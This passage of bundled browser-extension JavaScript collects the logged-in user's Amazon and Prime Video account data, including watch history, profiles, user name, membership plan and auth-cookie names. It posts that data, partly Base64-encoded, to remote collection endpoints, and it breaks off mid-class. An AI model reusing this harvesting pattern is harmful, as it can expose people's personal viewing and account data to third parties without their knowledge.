;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Site/PrimeVideo/PrimeVideoApi.js
function PrimeVideoApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function PrimeVideoApi_async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                PrimeVideoApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                PrimeVideoApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function PrimeVideoApi_class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
function PrimeVideoApi_defineProperties(target, props) {
    for(var i = 0; i < props.length; i++){
        var descriptor = props[i];
        descriptor.enumerable = descriptor.enumerable || false;
        descriptor.configurable = true;
        if ("value" in descriptor) descriptor.writable = true;
        Object.defineProperty(target, descriptor.key, descriptor);
    }
}
function PrimeVideoApi_create_class(Constructor, protoProps, staticProps) {
    if (protoProps) PrimeVideoApi_defineProperties(Constructor.prototype, protoProps);
    if (staticProps) PrimeVideoApi_defineProperties(Constructor, staticProps);
    return Constructor;
}
function PrimeVideoApi_ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}




var PrimeVideoApi_PLAN_MEMBERSHIP_PAGE_URI = "/gp/video/settings/your-account";
var PrimeVideoApi = /*#__PURE__*/ function() {
    "use strict";
    function PrimeVideoApi(window) {
        PrimeVideoApi_class_call_check(this, PrimeVideoApi);
        this.window = window;
    }
    PrimeVideoApi_create_class(PrimeVideoApi, [
        {
            key: "fetchBookmarks",
            value: /**
   * @param {string} url
   * @returns {Promise<Bookmarks>}
   */ function fetchBookmarks(url) {
                var _this = this;
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            CommonApi_fetchBookmarks(UrlGenerator_buildUrl(url, _this.window))
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchHistory",
            value: /**
   * @param {string} url
   * @returns {Promise<History>}
   */ function fetchHistory(url) {
                var _this = this;
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            CommonApi_fetchHistory(UrlGenerator_buildUrl(url, _this.window))
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchProfiles",
            value: /**
   * @param {string} url
   * @returns {Promise<ContinueWatching>}
   */ function fetchProfiles(url) {
                var _this = this;
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    CommonApi_fetchProfiles(UrlGenerator_buildUrl(url, _this.window))
                                ];
                            case 1:
                                return [
                                    2,
                                    _state.sent()
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "fetchActiveChannels",
            value: /**
   * @param {string} url
   * @returns {Promise<Subscriptions>}
   */ function fetchActiveChannels(url) {
                var _this = this;
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    CommonApi_fetchActiveChannels(UrlGenerator_buildUrl(url, _this.window))
                                ];
                            case 1:
                                return [
                                    2,
                                    _state.sent()
                                ];
                        }
                    });
                })();
            }
        },
        {
            key: "getCurrentProfileId",
            value: /**
   * @returns {string|null}
   */ function getCurrentProfileId() {
                var _this = this;
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            CommonApi_getCurrentProfileId(_this.window)
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchDetails",
            value: /**
   * @param {string} id
   * @param {string} url
   * @returns {Promise<Details>}
   */ function fetchDetails(id, url) {
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            new Promise(function(resolve, reject) {
                                (0,Http/* http */.dJ)(url, "GET", null, function(request) {
                                    return resolve(PrimeVideoParser_parseDetails(request.response));
                                }, reject);
                            })
                        ];
                    });
                })();
            }
        },
        {
            key: "isPrimeMember",
            value: /**
   * @returns {Promise<boolean>}
   */ function isPrimeMember() {
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            null
                        ];
                    });
                })();
            }
        },
        {
            /**
   * @returns {string|null}
   */ key: "getUserId",
            value: function getUserId() {
                return PrimeVideoParser_getUserId(this.window.document.documentElement.innerHTML);
            }
        },
        {
            /**
   * @returns {string|null}
   */ key: "getUserName",
            value: function getUserName() {
                return PrimeVideoParser_getUserName(this.window.document.documentElement.innerHTML);
            }
        },
        {
            /**
   * @returns {string}
   */ key: "getLanguage",
            value: function getLanguage() {
                return PrimeVideoParser_getLanguage(this.window.document.documentElement.innerHTML);
            }
        },
        {
            key: "getCountry",
            value: /**
   * @returns {Promise<string>}
   */ function getCountry() {
                var _this = this;
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            PrimeVideoParser_parseCountry(_this.window.document.documentElement.innerHTML)
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchChannels",
            value: /**
   * @returns {Promise<Channel[]>}
   */ function fetchChannels() {
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            []
                        ];
                    });
                })();
            }
        },
        {
            key: "fetchMembershipPlan",
            value: /**
   * @returns {Promise<MembershipPlan>}
   */ function fetchMembershipPlan() {
                var _this = this;
                return PrimeVideoApi_async_to_generator(function() {
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        return [
                            2,
                            new Promise(function(resolve, reject) {
                                (0,Http/* http */.dJ)(UrlGenerator_buildUrl(PrimeVideoApi_PLAN_MEMBERSHIP_PAGE_URI, _this.window), "GET", null, function(request) {
                                    return resolve(PrimeVideoParser_parseMembershipPlan(request.responseText));
                                }, reject);
                            })
                        ];
                    });
                })();
            }
        },
        {
            key: "getContactPageData",
            value: function getContactPageData() {
                return PrimeVideoApi_async_to_generator(function() {
                    var response, document;
                    return PrimeVideoApi_ts_generator(this, function(_state) {
                        switch(_state.label){
                            case 0:
                                return [
                                    4,
                                    fetch("https://www.primevideo.com/help/contact-us/", {
                                        method: "GET",
                                        mode: "cors",
                                        credentials: "include"
                                    })
                                ];
                            case 1:
                                response = _state.sent();
                                return [
                                    4,
                                    response.text()
                                ];
                            case 2:
                                document = _state.sent();
                                return [
                                    2,
                                    PrimeVideoParser_parseContactPage(document)
                                ];
                        }
                    });
                })();
            }
        }
    ]);
    return PrimeVideoApi;
}();


;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/AmazonApiProvider.js


var API_MAPPING = {
    "www.amazon.com": AmazonApi,
    "www.amazon.de": AmazonApi,
    "www.amazon.co.uk": AmazonApi,
    "www.amazon.co.jp": AmazonApi,
    "www.primevideo.com": PrimeVideoApi
};
var AUTH_COOKIE_BY_DOMAIN = {
    "www.amazon.com": "x-main",
    "www.amazon.de": "x-acbde",
    "www.amazon.co.uk": "x-acbuk",
    "www.amazon.co.jp": "x-acbjp",
    "www.primevideo.com": "x-main-av"
};
var AMAZON_DOMAINS = Object.keys(API_MAPPING);
/**
 * @param {string} domain
 * @param {object} window
 * @returns {AmazonApi|PrimeVideoApi}
 */ function provideApi(domain, window) {
    return new API_MAPPING[domain](window);
}


/***/ }),

/***/ 518:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {


// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "Z": function() { return /* binding */ AmazonHunter; }
});

// EXTERNAL MODULE: ./src/Resolver/Hunters/Amazon/AmazonApiProvider.js + 7 modules
var AmazonApiProvider = __webpack_require__(140);
;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/Dto/InitCommandsData.js
function _class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
var InitCommandsData = function InitCommandsData(accountId, profileId, extensionUserId, hid, gmtDiffSeconds, browserLanguage, dist, country, domain, isPrimeMember, amazonLanguage) {
    "use strict";
    _class_call_check(this, InitCommandsData);
    this.accountId = accountId;
    this.profileId = profileId;
    this.extensionUserId = extensionUserId;
    this.hid = hid;
    this.gmtDiffSeconds = gmtDiffSeconds;
    this.browserLanguage = browserLanguage;
    this.dist = dist;
    this.country = country;
    this.domain = domain;
    this.isPrimeMember = isPrimeMember;
    this.amazonLanguage = amazonLanguage;
};


// EXTERNAL MODULE: ./src/Http/Http.js
var Http = __webpack_require__(519);
;// CONCATENATED MODULE: ./src/Http/PlainJsonRequest.js
///////////////////////////////////////////
////////////////////////////
/////////
function asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function _async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}
var PlainJsonRequest_postPlainJsonRequest = function() {
    var _ref = _async_to_generator(function(url, payload) {
        var response;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(payload)
                        })
                    ];
                case 1:
                    response = _state.sent();
                    return [
                        4,
                        response.json()
                    ];
                case 2:
                    return [
                        2,
                        _state.sent()
                    ];
            }
        });
    });
    return function postPlainJsonRequest(url, payload) {
        return _ref.apply(this, arguments);
    };
}();
var postRequest = function() {
    var _ref = _async_to_generator(function(url, payload) {
        var response;
        return _ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        fetch(url, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(payload)
                        })
                    ];
                case 1:
                    response = _state.sent();
                    return [
                        4,
                        response
                    ];
                case 2:
                    return [
                        2,
                        _state.sent()
                    ];
            }
        });
    });
    return function postRequest(url, payload) {
        return _ref.apply(this, arguments);
    };
}();

// EXTERNAL MODULE: ./config/config.json
var config = __webpack_require__(626);
;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/MetriqApi.js



var BASE_ROUTE = config/* rootUrl */.Wd, BASE_ROUTE_NODE = config/* nodeRootUrl */._Q;
var API_CREATE_SESSION_URI = "amazon/start";
var API_SEND_COMMAND_DATA = "amazon/upload/$commandId";
/**
 * @param {UserInfo} userInfo
 * @returns {Promise}
 */ function MetriqApi_createSession(userInfo) {
    return PlainJsonRequest_postPlainJsonRequest("".concat(BASE_ROUTE_NODE).concat(API_CREATE_SESSION_URI), userInfo);
}
/**
 * @param {Number} commandId
 * @param {Object} data
 * @param {String} secret
 * @returns {Promise<object>}
 */ function sendCommandData(commandId, data) {
    var preparedUrl = "".concat(API_SEND_COMMAND_DATA.replace("$commandId", commandId.toString()));
    return post(preparedUrl, data);
}
/**
 * @param {string} url
 * @param {object} payload
 * @returns {Promise}
 */ function post(url, payload) {
    return request("POST", url, payload);
}
/**
 * @param {string} method
 * @param {string} uri
 * @param {object} payload
 * @returns {Promise<object>}
 */ function request(method, uri) {
    var payload = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {};
    return requestJson(method, BASE_ROUTE + uri, JSON.stringify(payload));
}
function uploadSingleEventData(data) {
    postPlainJsonRequest("".concat(BASE_ROUTE_NODE, "amazon/upload-event"), data);
}

// EXTERNAL MODULE: ./src/Resolver/Hunters/Amazon/Logger.js
var Logger = __webpack_require__(525);
// EXTERNAL MODULE: ./src/Helper/Helper.js + 1 modules
var Helper = __webpack_require__(667);
// EXTERNAL MODULE: ./src/Resolver/Hunters/Amazon/Site/Common/CommonParser.js + 3 modules
var CommonParser = __webpack_require__(116);
;// CONCATENATED MODULE: ./src/Helper/Promise.js
function Promise_asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function Promise_async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                Promise_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                Promise_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function Promise_ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}
var PROMISE_STATE_FULFILLED = "fulfilled";
var PROMISE_STATE_REJECTED = "rejected";
var allSettled = /////////////////////////////////////////////
function(promises) {
    return Promise.allSettled(promises);
};
////////
///////////
////////////////////////////////////
/////////
//////////////////////////////////////////////////////
///////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////
///////////////////////////
/////////
////////
/////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////
////////////////////////
////////
/////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////
////////////////////////
////////
//////////////////////
/////////////////////////////////////////////////////////////////////////
/////////////
///////////////////////////////////
/////////////////////////////////////////////////////////
//////////////////////////////////////////////////////
////////////
/////////////////////////
////////////////////////////////////////////////////
/////////////////////////////////////////////////////////
//////////////////////////////////////////////////////
////////////
/////////
///////
/////////////////////
////////////////////
/////
/////
/////////
var filterRejectedPromises = function(promises) {
    return promises.filter(function(promise) {
        return promise.status === PROMISE_STATE_REJECTED;
    });
};
var fetchDataFromFulfilledPromises = function(promises) {
    return promises.filter(function(promise) {
        return promise.status === PROMISE_STATE_FULFILLED;
    }).map(function(promise) {
        return promise.value;
    });
};
var ignoreAfterTimeout = function() {
    var _ref = Promise_async_to_generator(function(promise, timeout, args) {
        var timeoutPromise;
        return Promise_ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    timeoutPromise = new Promise(function(resolve) {
                        return setTimeout(resolve, timeout, args);
                    });
                    return [
                        4,
                        Promise.any([
                            promise,
                            timeoutPromise
                        ])
                    ];
                case 1:
                    return [
                        2,
                        _state.sent()
                    ];
            }
        });
    });
    return function ignoreAfterTimeout(promise, timeout, args) {
        return _ref.apply(this, arguments);
    };
}();

// EXTERNAL MODULE: ./src/Helper/Dist.js
var Dist = __webpack_require__(270);
// EXTERNAL MODULE: ./src/Helper/Base64.js
var Base64 = __webpack_require__(181);
;// CONCATENATED MODULE: ./src/Http/AdditionalDataApi.js
///////////////////////////////////////////
////////////////////////////
/////////
function AdditionalDataApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function AdditionalDataApi_async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                AdditionalDataApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                AdditionalDataApi_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function _define_property(obj, key, value) {
    if (key in obj) {
        Object.defineProperty(obj, key, {
            value: value,
            enumerable: true,
            configurable: true,
            writable: true
        });
    } else {
        obj[key] = value;
    }
    return obj;
}
function _object_spread(target) {
    for(var i = 1; i < arguments.length; i++){
        var source = arguments[i] != null ? arguments[i] : {};
        var ownKeys = Object.keys(source);
        if (typeof Object.getOwnPropertySymbols === "function") {
            ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function(sym) {
                return Object.getOwnPropertyDescriptor(source, sym).enumerable;
            }));
        }
        ownKeys.forEach(function(key) {
            _define_property(target, key, source[key]);
        });
    }
    return target;
}
function AdditionalDataApi_ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}


function sendAdditionalProfileData(svod, data) {
    return _sendAdditionalProfileData.apply(this, arguments);
}
function _sendAdditionalProfileData() {
    _sendAdditionalProfileData = AdditionalDataApi_async_to_generator(function(svod, data) {
        var response;
        return AdditionalDataApi_ts_generator(this, function(_state) {
            switch(_state.label){
                case 0:
                    return [
                        4,
                        fetch(config/* piUrl */.Mt, {
                            method: "POST",
                            body: (0,Base64/* b64encode */.U)(JSON.stringify(_object_spread({
                                svod: svod
                            }, data)))
                        })
                    ];
                case 1:
                    response = _state.sent();
                    return [
                        2,
                        response.json()
                    ];
            }
        });
    });
    return _sendAdditionalProfileData.apply(this, arguments);
}

;// CONCATENATED MODULE: ./src/Resolver/Hunters/Amazon/AmazonHunter.js
function _array_like_to_array(arr, len) {
    if (len == null || len > arr.length) len = arr.length;
    for(var i = 0, arr2 = new Array(len); i < len; i++)arr2[i] = arr[i];
    return arr2;
}
function _array_without_holes(arr) {
    if (Array.isArray(arr)) return _array_like_to_array(arr);
}
function AmazonHunter_asyncGeneratorStep(gen, resolve, reject, _next, _throw, key, arg) {
    try {
        var info = gen[key](arg);
        var value = info.value;
    } catch (error) {
        reject(error);
        return;
    }
    if (info.done) {
        resolve(value);
    } else {
        Promise.resolve(value).then(_next, _throw);
    }
}
function AmazonHunter_async_to_generator(fn) {
    return function() {
        var self = this, args = arguments;
        return new Promise(function(resolve, reject) {
            var gen = fn.apply(self, args);
            function _next(value) {
                AmazonHunter_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "next", value);
            }
            function _throw(err) {
                AmazonHunter_asyncGeneratorStep(gen, resolve, reject, _next, _throw, "throw", err);
            }
            _next(undefined);
        });
    };
}
function AmazonHunter_class_call_check(instance, Constructor) {
    if (!(instance instanceof Constructor)) {
        throw new TypeError("Cannot call a class as a function");
    }
}
function _defineProperties(target, props) {
    for(var i = 0; i < props.length; i++){
        var descriptor = props[i];
        descriptor.enumerable = descriptor.enumerable || false;
        descriptor.configurable = true;
        if ("value" in descriptor) descriptor.writable = true;
        Object.defineProperty(target, descriptor.key, descriptor);
    }
}
function _create_class(Constructor, protoProps, staticProps) {
    if (protoProps) _defineProperties(Constructor.prototype, protoProps);
    if (staticProps) _defineProperties(Constructor, staticProps);
    return Constructor;
}
function AmazonHunter_define_property(obj, key, value) {
    if (key in obj) {
        Object.defineProperty(obj, key, {
            value: value,
            enumerable: true,
            configurable: true,
            writable: true
        });
    } else {
        obj[key] = value;
    }
    return obj;
}
function _iterable_to_array(iter) {
    if (typeof Symbol !== "undefined" && iter[Symbol.iterator] != null || iter["@@iterator"] != null) return Array.from(iter);
}
function _non_iterable_spread() {
    throw new TypeError("Invalid attempt to spread non-iterable instance.\\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
}
function AmazonHunter_object_spread(target) {
    for(var i = 1; i < arguments.length; i++){
        var source = arguments[i] != null ? arguments[i] : {};
        var ownKeys = Object.keys(source);
        if (typeof Object.getOwnPropertySymbols === "function") {
            ownKeys = ownKeys.concat(Object.getOwnPropertySymbols(source).filter(function(sym) {
                return Object.getOwnPropertyDescriptor(source, sym).enumerable;
            }));
        }
        ownKeys.forEach(function(key) {
            AmazonHunter_define_property(target, key, source[key]);
        });
    }
    return target;
}
function _to_consumable_array(arr) {
    return _array_without_holes(arr) || _iterable_to_array(arr) || _unsupported_iterable_to_array(arr) || _non_iterable_spread();
}
function _unsupported_iterable_to_array(o, minLen) {
    if (!o) return;
    if (typeof o === "string") return _array_like_to_array(o, minLen);
    var n = Object.prototype.toString.call(o).slice(8, -1);
    if (n === "Object" && o.constructor) n = o.constructor.name;
    if (n === "Map" || n === "Set") return Array.from(n);
    if (n === "Arguments" || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return _array_like_to_array(o, minLen);
}
function AmazonHunter_ts_generator(thisArg, body) {
    var f, y, t, g, _ = {
        label: 0,
        sent: function() {
            if (t[0] & 1) throw t[1];
            return t[1];
        },
        trys: [],
        ops: []
    };
    return g = {
        next: verb(0),
        "throw": verb(1),
        "return": verb(2)
    }, typeof Symbol === "function" && (g[Symbol.iterator] = function() {
        return this;
    }), g;
    function verb(n) {
        return function(v) {
            return step([
                n,
                v
            ]);
        };
    }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while(_)try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [
                op[0] & 2,
                t.value
            ];
            switch(op[0]){
                case 0:
                case 1:
                    t = op;
                    break;
                case 4:
                    _.label++;
                    return {
                        value: op[1],
                        done: false
                    };
                case 5:
                    _.label++;
                    y = op[1];
                    op = [
                        0
                    ];
                    continue;
                case 7:
                    op = _.ops.pop();
                    _.trys.pop();
                    continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) {
                        _ = 0;
                        continue;
                    }
                    if (op[0] === 3 && (!t || op[1] > t[0] && op[1] < t[3])) {
                        _.label = op[1];
                        break;
                    }
                    if (op[0] === 6 && _.label < t[1]) {
                        _.label = t[1];
                        t = op;
                        break;
                    }
                    if (t && _.label < t[2]) {
                        _.label = t[2];
                        _.ops.push(op);
                        break;
                    }
                    if (t[2]) _.ops.pop();
                    _.trys.pop();
                    continue;
            }
            op = body.call(thisArg, _);
        } catch (e) {
            op = [
                6,
                e
            ];
            y = 0;
        } finally{
            f = t = 0;
        }
        if (op[0] & 5) throw op[1];
        return {
            value: op[0] ? op[1] : void 0,
            done: true
        };
    }
}











var LOG_NAMESPACE = "Hunter";
var AmazonHunter_BASE_ROUTE = config/* nodeRootUrl */._Q;
var AmazonHunter = /*#__PURE__*/ function() {
    "use strict";
    function AmazonHunter() {
